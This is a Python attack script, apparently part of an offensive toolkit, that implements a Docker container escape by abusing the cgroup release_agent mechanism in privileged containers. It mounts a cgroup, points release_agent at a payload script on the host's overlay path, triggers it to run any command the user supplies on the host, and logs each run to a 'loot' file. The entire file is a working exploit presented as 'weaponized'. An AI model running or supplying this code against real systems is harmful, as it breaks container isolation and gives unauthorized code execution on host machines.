import os
import sys
import subprocess

def attempt_breakout(payload_cmd):
    """
    Weaponized Docker Breakout: Exploits cgroup release_agent 
    to execute commands on the host OS.
    """
    print("[*] Initializing Container Escape Sequence...")
    
    try:
        # 1. Create a mount point for the cgroup controller
        if not os.path.exists("/tmp/cgrp"):
            os.makedirs("/tmp/cgrp")
        
        # 2. Mount the RDMA or Memory cgroup (often unprotected in privileged containers)
        subprocess.run(["mount", "-t", "cgroup", "-o", "rdma", "cgroup", "/tmp/cgrp"], check=True)
        
        # 3. Create a child cgroup
        if not os.path.exists("/tmp/cgrp/x"):
            os.makedirs("/tmp/cgrp/x")
        
        # 4. Enable notify_on_release in the child
        with open("/tmp/cgrp/x/notify_on_release", "w") as f:
            f.write("1")
            
        # 5. Determine the host path of the container's files
        # We find this by looking at the mount table from the host perspective
        host_path = subprocess.check_output("sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/mounts", shell=True).decode().strip()
        
        if not host_path:
            # Fallback/Manual check required if sed fails
            print("[-] Could not automatically determine host path. Escape may fail.")
            host_path = "/var/lib/docker/overlay2/..." 

        # 6. Set the release_agent to our malicious script
        # This path must be the path ON THE HOST
        cmd_path = f"{host_path}/cmd.sh"
        with open("/tmp/cgrp/release_agent", "w") as f:
            f.write(cmd_path)
            
        # 7. Create the actual payload script inside the container
        with open("/cmd.sh", "w") as f:
            f.write(f"#!/bin/sh\n{payload_cmd} > {host_path}/output.txt 2>&1")
        os.chmod("/cmd.sh", 0o755)
        
        # 8. Trigger the exploit by starting and immediately finishing a process in the cgroup
        print("[*] Triggering Release Agent...")
        subprocess.run("sh -c 'echo 0 > /tmp/cgrp/x/cgroup.procs'", shell=True)
        
        print("[!!!] SUCCESS: Escape triggered. Check host for execution.")
        
        # Log to project loot
        loot_path = "../../../loot/breakout_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: DOCKER_ESCAPE | Payload: {payload_cmd}\n")

    except Exception as e:
        print(f"[-] Breakout Fault: {e}")
        print("[*] Note: This requires --privileged or CAP_SYS_ADMIN.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: 154_docker_breakout '<command_to_run_on_host>'")
        sys.exit(1)
    
    attempt_breakout(sys.argv[1])
